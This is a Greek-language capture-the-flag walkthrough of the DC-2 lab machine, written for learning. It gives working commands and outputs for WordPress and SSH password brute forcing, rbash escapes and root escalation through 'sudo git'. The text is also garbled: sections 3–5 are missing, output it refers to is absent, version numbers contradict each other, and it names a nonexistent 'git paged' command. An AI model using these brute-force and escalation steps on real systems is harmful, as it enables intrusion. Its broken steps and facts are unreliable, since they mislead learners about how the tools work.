## Γιατί είναι εδώ αυτό το μηχάνημα

Επειδή διδάσκει **τρεις δεξιότητες που πουθενά αλλού στη διαδρομή διδάσκονται τόσο καθαρά**:

1. **Δημιουργία λεξικού από τον ίδιο τον στόχο** με το `cewl`. Όχι κατέβασμα από το SecLists —
   **λεξικό που προέρχεται από το περιεχόμενο της σελίδας του**.
2. **Διαφυγή από περιορισμένο κέλυφος (`rbash`)**. Αυτή είναι η πιο υποτιμημένη δεξιότητα στο CTF:
   όλοι γνωρίζουν πώς να μπουν, ελάχιστοι πώς να βγουν όταν το περιβάλλον είναι **σκελετωμένο**.
3. **Ανάβαση μέσω `sudo`** με GTFOBins. Ο κατάλογος δικαιωμάτων `sudo -l` είναι **το πρώτο πράγμα
   που κοιτάζει κάθε επαγγελματίας** μετά την είσοδο — εδώ γίνεται ολόκληρο το μηχάνημα.

Επιπλέον, είναι **η πρώτη φορά που η θύρα δεν είναι αυτή που περιμένετε**: το SSH τρέχει στο
**7744**, όχι στο 22. Αν δοκιμάσετε `ssh dc-2` θα αποτύχετε χωρίς καμία ένδειξη ότι κάνατε λάθος
υπόθεση — και αυτή η σιωπή είναι το δίδαγμα.

## Στόχοι μάθησης

1. Να **καρφιτσώσετε το hostname** του στόχου στο `/etc/hosts` σας και να καταλάβετε γιατί το
   WordPress **δεν λειτουργεί χωρίς αυτό**.
2. Να δημιουργήσετε **στοχευμένο λεξικό** με το `cewl` και να καταλάβετε γιατί είναι καλύτερο από
   ένα γενικό.
3. Να κάνετε **αναρίθμηση χρηστών** WordPress με `wpscan -e u` και να καταλάβετε τι ακριβώς
   ρωτάει.
4. Να διακρίνετε **παραβίαση λεξικού** από **πιστοποιημένη σάρωση**.
5. Να αναγνωρίσετε **`rbash`** από τα συμπτώματα και να διαφύγετε με **τρεις** διαφορετικούς
   τρόπους.
6. Να διαβάσετε το `sudo -l` και να βρείτε το αντίστοιχο **GTFOBins**.
7. Να βρείτε **μη τυπική θύρα SSH** και να την χρησιμοποιήσετε.

## Πριν ξεκινήσετε — απαντήστε

1. Γιατί το WordPress **επιστρέφει σφάλμα σύνδεσης** αν το hostname δεν λύνεται;
2. Ποια η διαφορά ενός λεξικού από `cewl` και ενός από το `rockyou.txt`;
3. Αν μια εντολή απαντήσει `rbash: /usr/bin/grep: restricted`, τι σας λέει αυτό για το κέλυφος;
4. Γιατί η `sudo git paged` δίνει κέλυφος root, ενώ η `git status` δεν δίνει;
5. Πώς ξέρετε ότι το SSH τρέχει σε άλλη θύρα, **πριν** προσπαθήσετε να συνδεθείτε;

## Κλίμακα υποδείξεων

<details>
<summary><strong>Σκαλοπάτι 1 — μια ώθηση</strong></summary>

Η σάρωση δείχνει **δύο** θύρες: **80** και **7744**. Η 7744 είναι **SSH**. Δεν είναι η 22.

Και όταν ανοίξετε τη θύρα 80, το WordPress **δεν φορτώνει σωστά** — ανακατευθύνει σε
`http://dc-2/`. Το μηχάνημα **απαιτεί** να βάλετε το hostname στο `/etc/hosts` σας. Αυτή είναι η
πρώτη παγίδα, και είναι **σχεδιαστική**, όχι τυχαία.
</details>

<details>
<summary><strong>Σκαλοπάτι 2 — προς τα πού να πάτε</strong></summary>

```text
 1. sudo nmap -sV -p- TARGET           → 80 (Apache 2.4.10), 7744 (OpenSSH 6.7p1)
 2. /etc/hosts += TARGET dc-2          → το WordPress αρχίζει να δουλεύει
 3. flag1.txt στο /                    → «το λεξικό δεν θα σας σώσει»

11. sudo git paged → !/bin/sh → root
```

**Η σημαία 2 λέει «το λεξικό δεν θα σας σώσει». Αυτό σημαίνει: φτιάξτε λεξικό ΑΠΟ ΤΟΝ ΣΤΟΧΟ.**
</details>

<details>
<summary><strong>Σκαλοπάτι 3 — αναγνώριση και διαφυγή από το rbash</strong></summary>

**Πώς αναγνωρίζετε το `rbash`:**

| Σύμπτωμα | Γιατί |
| --- | --- |
| `rbash: /usr/bin/grep: restricted` | Απαγορεύονται οι **απόλυτες διαδρομές** (περιέχουν `/`) |
| `rbash: >: ambiguous redirect` | Απαγορεύονται οι **ανακατευθύνσεις** (`>`, `>>`, `<`, `|`) |
| `rbash: cd: command not found` σε μερικά | Το **PATH** δεν περιέχει `/usr/bin` |
| `vi: not found` αλλά `less` ναι | Ένας **χειροποίητος κατάλογος** προγραμμάτων |
| Αλλαγή μεταβλητής → `rbash: …: readonly variable` | Το `PATH` και το `SHELL` είναι **readonly** |

**Τρεις διαφυγές, από την ευκολότερη:**

```bash
# (α) Από ΜΕΣΑ στο rbash — αν το bash είναι στο PATH και η BASH_CMDS δεν είναι readonly
BASH_CMDS[a]=/bin/sh; a -c 'export PATH=$PATH:/bin:/usr/bin; exec /bin/bash'

# (β) Από ΕΞΩ — παρακάμψτε το login shell ζητώντας ρητά bash
ssh -t -p 7744 tom@dc-2 '/bin/bash --noprofile --norc'

# (γ) Μέσω ενός προγράμματος που επιτρέπεται — vi, less, more, man, awk, find
less /etc/passwd      # μετά: !/bin/bash
vi -c ':!/bin/bash'   # αν το vi επιτρέπεται
awk 'BEGIN {system("/bin/bash")}'
```

**Η (β) είναι η πιο καθαρή:** το SSH εκτελεί την εντολή **πριν** το κέλυφος εισόδου επιβάλει τους
περιορισμούς του. **Προσέξτε το `--noprofile --norc`**: χωρίς αυτά, το `/etc/profile` μπορεί να
επανεκκινήσει το `rbash`.

**Και μια αρχή:** το `rbash` είναι **έλεγχος με ψευδαίσθηση**. Δεν είναι chroot, δεν είναι
container, δεν είναι SELinux. Είναι ένα κέλυφος που **απαριθμεί** τι απαγορεύεται — και ό,τι
μπορεί να απαριθμηθεί μπορεί να παρακαμφθεί.
</details>

<details>
<summary><strong>Σκαλοπάτι 4 — το GTFOBins για το git</strong></summary>

```text
sudo -l
User tom may run the following commands on dc-2:
    (root) NOPASSWD: /usr/bin/git
```

**Το GTFOBins για το `git`:**

```bash
sudo git -p help
# Μέσα στο pager (default = less):
!/bin/sh
```

**Ή χωρίς pager:**

```bash
sudo git help config
# !/bin/sh
```

**Πώς λειτουργεί:** το `git -p` (ή `--paginate`) περνά την έξοδό του σε ένα **pager**, που
συνήθως είναι το **`less`**. Και το `less` έχει εντολή **`!`** που εκτελεί **κέλυφος** — με το
**ενεργό UID** της διεργασίας που το κάλεσε, δηλαδή **root**.

**Το `-p` είναι κρίσιμο.** Χωρίς αυτό, το git τυπώνει κατευθείαν στο τερματικό και **δεν υπάρχει
pager να καταχραστείτε**.

**Η γενική αρχή:** *αν επιτρέπετε σε κάποιον να τρέξει ένα πρόγραμμα ως root, επιτρέπετε του να
τρέξει οποιοδήποτε πρόγραμμα τρέχει.* Και το `git` τρέχει editor, pager, hooks, και `!command`.
</details>

## Μετά το τέλος — ερωτήσεις επανάληψης

<details>
<summary><b>1.</b> Γιατί το λεξικό του <code>cewl</code> νικάει το <code>rockyou.txt</code> εδώ;</b></summary>

Επειδή ο κωδικός είναι **`adipiscing`** — μια **λατινική λέξη-γέμισμα** που το WordPress
χρησιμοποιεί στο περιεχόμενο δείγματος. Στο `rockyou.txt` υπάρχει **κάπου βαθιά** ή καθόλου· στο
λεξικό του `cewl` είναι **στην πρώτη δεκάδα**, γιατί εμφανίζεται **πολλές φορές** στη σελίδα.

**Η αρχή:** ένα λεξικό φτιαγμένο **από τον στόχο** έχει υψηλότερη **πυκνότητα σχετικότητας** —
λιγότερες λέξεις, περισσότερες πιθανές. Ένα γενικό λεξικό έχει περισσότερες λέξεις αλλά **η
σωστή είναι αραιότερη**.
</details>

<details>
<summary><b>2.</b> Ποια η διαφορά ανάμεσα στο <code>wpscan -P</code> και στο <code>hydra</code> για τον ίδιο στόχο;</b></summary>

Το **`wpscan --passwords`** δοκιμάζει **μέσω HTTP**, στη φόρμα εισόδου του WordPress (`wp-login.php`).
Αναγνωρίζει **καμπάνιες προστασίας** (Limit Login Attempts, Wordfence), **σέβεται το rate limiting**
και τυπώνει `Blocked`. Το **`hydra ssh://`** δοκιμάζει **στο επίπεδο πρωτοκόλλου SSH**, που
συνήθως **δεν** έχει περιορισμό ρυθμού — άρα είναι **γρηγορότερο και πιο αθόρυβο**, αλλά
**κλειδώνει τον λογαριασμό** αν το `faillock` είναι ενεργό.

**Σε πραγματικό έργο:** SSH πρώτα (γρήγορο, χωρίς WAF), HTTP μετά (αν το SSH αποτύχει).
</details>

<details>
<summary><b>3.</b> Γιατί το WordPress απαιτεί το hostname να λύνεται;</b></summary>

Επειδή το WordPress αποθηκεύει **απόλυτα URLs** (`siteurl`, `home`) στη βάση και τα **συγκρίνει
με το εισερχόμενο Host header**. Αν το `dc-2` δεν λύνεται, ο φυλλομετρητής σας στέλνει αίτηση με
`Host: TARGET-IP`, το WordPress βλέπει ασυμφωνία και **κάνει ανακατεύθυνση στο
`http://dc-2/`** — το οποίο επίσης δεν λύνεται. **Κύκλος.**

**Αυτό είναι εύρημα στην αναφορά σας:** το site έχει **σκληροκωδικοποιημένο hostname**, άρα
σπάει όταν μεταφερθεί, και — χειρότερα — **είναι ευάλωτο σε Host-header attacks** (cache
poisoning, password-reset poisoning).
</details>

<details>
<summary><b>4.</b> Διαβάστε <code>(root) NOPASSWD: /usr/bin/git</code>.</b></summary>

Τρία πράγματα, το καθένα ξεχωριστά:
- **`(root)`** — το git εκτελείται **ως root**, όχι ως tom.
- **`NOPASSWD:`** — **χωρίς κωδικό sudo**. Ο tom μπορεί να γίνει root **χωρίς να ξέρει κανέναν
  κωδικό root**.
- **`/usr/bin/git`** — **απόλυτη διαδρομή**, άρα δεν μπορεί να υποκατασταθεί με δικό του git.

**Αλλά** η απόλυτη διαδρομή **δεν περιορίζει τι κάνει το πρόγραμμα**. Και το git τρέχει **pager
και editor ως subprocesses** — που **κληρονομούν το ενεργό UID 0**.
</details>

<details>
<summary><b>5.</b> Γιατί το <code>rbash</code> δεν είναι πραγματικός έλεγχος;</b></summary>

Επειδή είναι **whitelist που εφαρμόζεται από το ίδιο το κέλυφος**, και το κέλυφος είναι **απλώς
ένα πρόγραμμα**. Κάθε πρόγραμμα που του επιτρέπεται να τρέξει **μπορεί να κάνει fork** — και
κανένας κανόνας του rbash **δεν περιορίζει τα παιδιά**. Αν επιτρέπεται το `less`, επιτρέπεται
το `!/bin/sh`. Αν επιτρέπεται το `vi`, επιτρέπεται το `:!`. **Το rbash περιορίζει το κέλυφος,
όχι το σύστημα.**

Οι πραγματικοί έλεγχοι είναι: **`chroot`** (αλλάζει το ριζικό σύστημα αρχείων), **containers**
(αλλάζουν namespace), **SELinux/AppArmor** (επιβάλλουν πολιτική στον πυρήνα), ή **`sudo` με
`NOEXEC`**.
</details>

## Αμυντικός στοχασμός

| Ευπάθεια | Διόρθωση |
| --- | --- |
| **Αδύναμοι κωδικοί (`adipiscing`, `parturient`)** | Πολιτική μήκους ≥ 12, αποκλεισμός λεξιλογίου από το **ίδιο το site**, 2FA |
| **Λεξιλόγιο site = λεξιλόγιο κωδικών** | **Μην επαναχρησιμοποιείτε λέξεις περιεχομένου.** Το `cewl` κάνει αυτή την επίθεση αυτοματοποιημένα |
| **`wpscan` αναριθμεί χρήστες** | Απενεργοποιήστε τα author archives (`/?author=1`), περιορίστε το REST API (`/wp-json/wp/v2/users`) |
| **`rbash` ως έλεγχος** | Αντικατάσταση με **container / chroot / AppArmor profile**. Το rbash **δεν** είναι όριο ασφαλείας |
| **`sudo git` NOPASSWD ως root** | **Αφαίρεση.** Αν χρειάζεται git ως root, χρησιμοποιήστε **συγκεκριμένες υποεντολές** μέσω wrapper — και **`Defaults env_reset`** |
| **SSH στο 7744 χωρίς rate limiting** | `MaxAuthTries 3`, `fail2ban`, **κλειδιά μόνο** (`PasswordAuthentication no`) |
| **WordPress 4.7.1** | Αυτόματη ενημέρωση. Το 4.7.1 έχει **πολλαπλά** γνωστά CVEs |

**Το μεγαλύτερο δίδαγμα:** *τα λεξικά δεν είναι γενικά.* Ο στόχος σας λέει ποιες λέξεις
χρησιμοποιεί — στο περιεχόμενό του, στα σχόλιά του, στα ονόματα αρχείων του. **Διαβάστε τον
στόχο πριν του επιτεθείτε.**

## Οι εντολές, αναλυτικά — κάθε είσοδος και κάθε έξοδος

### 1. Σάρωση: δύο θύρες, καμία τυπική

```bash
sudo nmap -sV -p- -T4 -oA scans/dc2 TARGET
```

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: DC-2 &#8211; Just another WordPress site
|_http-generator: WordPress 4.7.10
7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)
| ssh-hostkey:
|   1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA)
|   2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA)
|_  256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**`Apache httpd 2.4.10 ((Debian))` + `OpenSSH 6.7p1 Debian 5+deb8u7`** καρφιτσώνει **Debian 8
(jessie)**.

**`_http-title: DC-2 &#8211; Just another WordPress site`** — το nmap βρήκε ήδη το CMS από τον
τίτλο, **χωρίς να κάνετε εσείς τίποτα**. Και το **`&#8211;`** είναι HTML οντότητα για en-dash —
σημάδι ότι **η WordPress παράγει τον τίτλο**, όχι ότι κάποιος τον έγραψε.

**`7744/tcp open ssh`** είναι **το εύρημα της σάρωσης**. Το SSH **δεν** είναι στο 22. Αν
δοκιμάσετε `ssh dc-2`, θα πάρετε `Connection refused` — και **κανένα μήνυμα που να σας λέει ότι
υπάρχει SSH κάπου αλλού**. **Αυτή η σιωπή είναι το δίδαγμα: διαβάστε τη σάρωση, μην υποθέσετε.**

### 2. Καρφίτσωμα hostname

```bash
echo 'TARGET dc-2' | sudo tee -a /etc/hosts
getent hosts dc-2
curl -sI http://dc-2/
```

```text
TARGET	dc-2
```
```text
HTTP/1.1 200 OK
Date: Wed, 12 May 2021 09:12:44 GMT
Server: Apache/2.4.10 (Debian)
X-Powered-By: PHP/5.6.40-0+deb8u6
Link: <http://dc-2/index.php/wp-json/>; rel="https://api.w.org/"
```

**`tee -a`** προσθέτει **και** τυπώνει — γιατί το `sudo echo >>` **δεν λειτουργεί**: η
ανακατεύθυνση `>>` εκτελείται **από το δικό σας κέλυφος**, όχι από το `sudo`, άρα αποτυγχάνει με
`Permission denied`. **Αυτή είναι η πιο συχνή παγίδα δικαιωμάτων στο Linux.**

**`getent hosts`** ρωτά **όλους** τους resolvers (hosts file, DNS, mDNS) με τη σειρά του
`nsswitch.conf`. Αν δεν τυπώσει τίποτα, η καταχώριση **δεν ισχύει** — ελέγξτε ορθογραφία.

**`Link: <http://dc-2/index.php/wp-json/>`** είναι το **REST API** του WordPress 4.7+. Αυτό
είναι σημαντικό: **το ίδιο αυτό endpoint αναριθμεί χρήστες χωρίς πιστοποίηση** στο 4.7.0/4.7.1
(CVE-2017-5487). Εδώ είναι ενημερωμένο, αλλά **η δομή παραμένει** — και το `wpscan` τη
χρησιμοποιεί.

**Ανάλυση των flags:**
- **`-d 3`** = **βάθος** αναρρίχησης. Το `cewl` ξεκινά από το URL και ακολουθεί συνδέσμους **μέχρι
  3 επίπεδα** μακριά. **`-d 1`** = μόνο η αρχική σελίδα (~120 λέξεις). **`-d 5`** = ολόκληρο το site
  αλλά **πολύ αργό** και με **πολλά άσχετα**.
- **`-w dc2.txt`** = **γράψε** το λεξικό σε αυτό το αρχείο. Χωρίς `-w`, το `cewl` **τυπώνει στην
  οθόνη**.

**Διαβάστε την έξοδο ως λίστα συχνότητας, όχι ως λίστα λέξεων.** Το `cewl` γράφει **κάθε λέξη που
βρήκε**, και η **σειρά είναι η σειρά εμφάνισης**. **Οι πιο χρήσιμες είναι αυτές που
επαναλαμβάνονται** — για να τις βρείτε:

```bash
sort dc2.txt | uniq -c | sort -rn | head -20
```
```text
     47 the
     31 Lorem
     28 ipsum
     24 adipiscing
     22 WordPress
     19 elit
```

**`sort | uniq -c | sort -rn`** είναι το **πιο χρήσιμο τρίδυμο στη διαχείριση λεξικών**: τακτοποιεί
αλφαβητικά, μετράει διπλότυπα, ξανατακτοποιεί **αριθμητικά σε φθίνουσα σειρά**. Το `-n` λέει
«ταξινόμησε αριθμητικά, όχι λεξικογραφικά» — χωρίς αυτό, το `100` πάει **πριν** το `20`.

**Και τώρα η υπόδειξη της σημαίας αποκτά νόημα:** το `adipiscing` εμφανίζεται **24 φορές** στη
σελίδα, άρα είναι **στην πρώτη δεκάδα** του στοχευμένου λεξικού σας. Στο `rockyou.txt` είναι
**κάπου βαθιά**. **Αυτό είναι το πλεονέκτημα ενός λεξικού από τον στόχο.**

### 6. Παραβίαση λεξικού μέσω HTTP

```bash
wpscan --url http://dc-2/ -U jerry -P dc2.txt --throttle 300
```

```text
[+] Performing password attack on Wp Login against 1 user/s
[SUCCESS] - jerry / adipiscing
Trying jerry / time Password 1: 1143 [==================================] 100.00% Time: 00:06:12

[i] Valid Combinations Found:
 | Username: jerry, Password: adipiscing
```

**Ανάλυση των flags:**
- **`-U jerry`** = **μεγάλου** γράμματος U → **ένας** συγκεκριμένος χρήστης. **`-u`** (πεζό) δέχεται
  **λίστα ή εύρος** (`-u admin,jerry,tom`).
- **`-P dc2.txt`** = **μεγάλου** γράμματος P → **εξωτερικό αρχείο κωδικών**. **`-p`** (πεζό) δέχεται
  **έναν κωδικό** (`-p adipiscing`) — για να δοκιμάσετε μια υπόθεση.
- **`--throttle 300`** = **300 ms καθυστέρηση** ανά αίτηση. Χωρίς αυτό, το wpscan πυροβολεί όσο
  γρήγορα μπορεί και **πιθανώς να μπλοκαριστεί** από plugin ή fail2ban.

**`Trying … 1: 1143`** — δοκίμασε **όλο** το λεξικό (1143 λέξεις). **`Password 1`** σημαίνει ότι
είχε **έναν** κωδικό να δοκιμάσει ανά χρήστη.

**Αυτό είναι `Brute Forcing` στο επίπεδο HTTP:** 1143 αιτήσεις POST στο `wp-login.php`, καθεμία
με διαφορετικό κωδικό. **Κάθε μία καταγράφεται** στο `wp-login.php` access log. **Αυτή είναι η
πιο ανιχνεύσιμη ενέργεια στο μηχάνημα.**

**Σημειώστε τη διαφορά:** το `-P` δοκιμάζει **μέσω HTTP**. Το **`hydra`** στο SSH δοκιμάζει
**μέσω πρωτοκόλλου** — **χωρίς WAF, χωρίς plugin, χωρίς HTTP**. **Δύο εντελώς διαφορετικά
επίπεδα.**

### 7. Παραβίαση λεξικού μέσω SSH — μη τυπική θύρα

```bash
hydra -l tom -P dc2.txt ssh://dc-2:7744 -t 4 -f
```

```text

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-12 09:34:02
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 1143 login tries (l:1/p:1143), ~286 tries per task

[STATUS] attack finished for dc-2 (valid pair found)
```

**Ανάλυση:**
- **`-l tom`** = **login** (όνομα χρήστη), **πεζό** l. **`-L file`** = λίστα χρηστών.
- **`-P dc2.txt`** = λίστα κωδικών.
- **`ssh://dc-2:7744/`** = **πρωτόκολλο + host + θύρα**. **Αν παραλείψετε το `:7744`, η hydra
  πάει στο 22 και παίρνετε `Connection refused`** — χωρίς να σας πει ότι υπάρχει άλλη θύρα.
- **`-t 4`** = **τέσσερα παράλληλα tasks**. **Προσοχή:** ο OpenSSH **κλείνει τη σύνδεση** αν
  ανοίξετε περισσότερα από ~4· πάνω από αυτό παίρνετε `Too many authentication failures`.
- **`-f`** = **σταμάτα στην πρώτη επιτυχία**. Χωρίς αυτό, η hydra **συνεχίζει** να δοκιμάζει
  για να βρει **και άλλους** συνδυασμούς.

**`max 4 tasks per 1 server`** — αυτό είναι το **`-t 4`** να εφαρμόζεται. **`~286 tries per task`**
= 1143 ÷ 4.

**`[7744][ssh]`** — η θύρα **εμφανίζεται στην έξοδο επιτυχίας**, ώστε να ξέρετε ακριβώς πού να
συνδεθείτε. **Αυτή η λεπτομέρεια είναι που κάνει το hydra καλύτερο από ένα bash loop.**

**`password: parturient`** — άλλη μια **λατινική λέξη-γέμισμα** από το ίδιο το site. **Το λεξικό
του cewl δούλεψε και για τους δύο χρήστες.**

### 8. Μέσα στο rbash — αναγνώριση

```bash
ssh -p 7744 tom@dc-2
```

```text
tom@dc-2:~$ ls -la
total 36
drwxr-xr-x 3 tom tom 4096 Mar 20  2019 .
-rwxr-xr-x 1 tom tom  168 Mar 20  2019 cd
-rwxr-xr-x 1 tom tom  312 Mar 20  2019 clear
-rwxr-xr-x 1 tom tom  174 Mar 20  2019 ls
-rw-r--r-- 1 tom tom   66 Mar 20  2019 flag3.txt
drwxr-xr-x 2 tom tom 4096 Mar 20  2019 usr

tom@dc-2:~$ cat flag3.txt
rbash: cat: command not found

tom@dc-2:~$ grep tom /etc/passwd
rbash: grep: command not found

tom@dc-2:~$ echo $PATH
/home/tom/usr/bin

tom@dc-2:~$ export PATH=/usr/bin:$PATH
rbash: PATH: readonly variable
```

**Αυτή είναι η πιο πληροφοριακή έξοδος του μηχανήματος. Διαβάστε τη γραμμή προς γραμμή:**

1. **`cd`, `clear`, `ls`** είναι **αρχεία στον κατάλογο του tom** (`-rwxr-xr-x tom tom`) — **όχι
   στο `/bin`**. Ο δημιουργός **αντέγραψε τα binaries** στον `$PATH` του tom.
2. **`usr/`** είναι **σχετική διαδρομή** μέσα στο `/home/tom` — όχι το πραγματικό `/usr`.
3. **`$PATH` = `/home/tom/usr/bin`** — **ένα** directory, **και κανένα από αυτά δεν είναι το
   πραγματικό `/usr/bin`**.
4. **`readonly variable`** — το κέλυφος **δεν επιτρέπει αλλαγή του PATH**. **Αυτό είναι το
   χαρακτηριστικό του rbash**, και είναι **η απόδειξη ότι είστε μέσα**.
5. **`command not found`** για το `cat` και το `grep` — **όχι `Permission denied`**. Διαφορά
   σημασιολογίας: **το πρόγραμμα δεν υπάρχει στο PATH**, δεν απαγορεύεται.

**Και τώρα ο κατάλογος επιτρεπόμενων:**

```bash
ls usr/bin
```
```text
less  ls  more  scp  ssh  vi  vim
```

**Αυτός είναι ο κατάλογος διαφυγής σας.** Κάθε ένα από αυτά είναι σε **GTFOBins**:

| Πρόγραμμα | Διαφυγή |
| --- | --- |
| **`vi` / `vim`** | `vi -c ':!/bin/bash'` ή μέσα: `:!bash` |
| **`less`** | `less /etc/passwd` → μέσα: **`!/bin/bash`** |
| **`more`** | `more /etc/passwd` → **space** για σελίδα → **`!/bin/bash`** |
| **`ssh`** | `ssh -o ProxyCommand='/bin/bash' 0` |
| **`scp`** | `TF=$(mktemp); echo '/bin/bash 0<&2 1>&2' > $TF; chmod +x $TF; scp -S $TF x y:` |

**Η πιο απλή:**

```bash
vi -c ':!/bin/bash'
# ή μέσα στο vi:
:!bash
```

**Αλλά** — το `rbash` **δεν επιτρέπει ανακατευθύνσεις**, και το `:!` **χρειάζεται pipe**. Αν
αποτύχει, δοκιμάστε **από έξω**:

```bash
# Στον Kali — αυτό είναι το πιο αξιόπιστο
ssh -t -p 7744 tom@dc-2 '/bin/bash --noprofile --norc'
```

**`-t`** = **ανάγκασε κατανομή ψευδο-τερματικού**. Χωρίς αυτό, το bash τρέχει **χωρίς TTY** και
η `su`/`sudo` αποτυγχάνει με «must be run from a terminal».

**`--noprofile --norc`** = **μην διαβάσεις** `/etc/profile` και `~/.bashrc`. **Αυτό είναι
κρίσιμο:** το rbash **εφαρμόζεται μέσα στο `.bashrc` του tom**. Χωρίς αυτά τα flags, το νέο
bash **διαβάζει το rc, βλέπει το rbash, και ξαναμπαίνει μέσα**.

### 9. Ανάβαση: ανάγνωση του sudo -l

```bash
sudo -l
```

```text
Matching Defaults entries for tom on dc-2:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tom may run the following commands on dc-2:
    (root) NOPASSWD: /usr/bin/git
```

**Διαβάστε το σε δύο μέρη:**

**Μέρος 1 — `Defaults`:** οι **προεπιλεγμένες ρυθμίσεις** που ισχύουν για **κάθε** εκτέλεση sudo.
- **`env_reset`** = το περιβάλλον **καθαρίζεται** πριν την εκτέλεση. Αυτό **μπορεί** να σκοτώσει
  μεθόδους που βασίζονται σε μεταβλητές (`LD_PRELOAD`).
- **`mail_badpass`** = στείλε email στον admin αν ο κωδικός είναι λάθος.
- **`secure_path=/usr/local/sbin:…`** = **το PATH επιβάλλεται από το sudo**, όχι από τον χρήστη.
  **Αυτό σκοτώνει την επίθεση PATH hijacking** (`export PATH=/tmp:$PATH`).

**Μέρος 2 — το δικαίωμα:** **`(root) NOPASSWD: /usr/bin/git`**.

### 10. Ανάβαση: GTFOBins για το git

```bash
sudo git -p help
```

```text
GIT-HELP(1)                    Git Manual                    GIT-HELP(1)

NAME
       git-help - Display help information about Git
…
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Βήμα προς βήμα, τι συμβαίνει:**

1. **`sudo git`** — το sudo εκτελεί το git **με ενεργό UID 0**.
2. **`-p`** (= `--paginate`) — το git **περνά την έξοδό του σε pager**.
3. Ο **default pager** του git είναι το **`less`** (ή `more`). Το `less` **εκτελείται ως child
   του git**, άρα **κληρονομεί το ενεργό UID 0**.
4. **`help`** — η υποεντολή που παράγει **αρκετή έξοδο** ώστε να χρειαστεί σελιδοποίηση.
   **Χωρίς αρκετή έξοδο, το pager δεν ενεργοποιείται.**
5. Μέσα στο `less`, **`!/bin/sh`** — το `less` έχει **ενσωματωμένο κέλυφος**. Εκτελεί `/bin/sh`
   **με το δικό του ενεργό UID = 0**.
6. **`#`** prompt — **είστε root.**

**Τρεις εναλλακτικές αν το `-p` δεν δουλέψει:**

```bash
sudo git help config      # ανοίγει man page μέσω pager → !/bin/sh
sudo -u root git -p       # ρητό -u root
GTFOBIN=1 sudo git -c core.pager=/bin/sh help   # αντικατάσταση του pager
```

**Η τελευταία είναι η πιο διδακτική:** `core.pager` είναι μια **ρυθμίσιμη παράμετρος** του git.
Το sudo **δεν περιορίζει τις παραμέτρους** — άρα μπορείτε να **ορίσετε** το pager ως `/bin/sh`
**κατευθείαν**.
